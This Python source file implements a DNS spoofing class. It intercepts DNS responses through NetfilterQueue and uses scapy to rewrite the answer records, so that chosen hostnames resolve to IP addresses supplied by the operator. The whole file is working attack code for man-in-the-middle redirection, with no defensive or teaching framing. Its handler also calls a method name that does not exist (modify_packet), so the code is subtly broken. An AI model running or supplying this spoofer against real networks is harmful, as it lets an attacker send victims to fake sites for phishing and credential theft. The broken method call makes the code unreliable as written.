from typing import Dict

from scapy.packet import Packet
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from netfilterqueue import NetfilterQueue

from objects.interfaces import Interface
from utils.output import print_permission_error, print_text


class DNSSpoofer:

    def __init__(
        self,
        host_to_ip: Dict[bytes, str],
        interface: Interface,
    ) -> None:
        self._interface = interface
        self._host_to_ip = host_to_ip

    def _handle_DNS_packet(self, packet: Packet):
        
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            
            print_text("[Before]:", scapy_packet.summary(), attrs=['bold'])

            try:
                scapy_packet = self.modify_packet(scapy_packet)

            except IndexError:
                pass

            print_text("[After ]:", scapy_packet.summary(), attrs=['bold'])
            
            packet.set_payload(bytes(scapy_packet))
        
        packet.accept()
    
    def modify_DNS_packet(self, packet: Packet):

        qname = packet[DNSQR].qname

        if qname not in self._host_to_ip:

            print_text(f"no modification: {qname}", attrs=['bold'])

            return packet

        packet[DNS].an = DNSRR(rrname=qname, rdata=self._host_to_ip[qname])
        packet[DNS].ancount = 1
        
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        
        return packet
    
    def start(self, queue_num: int):

        try:
            queue = NetfilterQueue()
            queue.bind(queue_num, self._handle_DNS_packet)
            queue.run()
        
        except OSError:
            print_permission_error()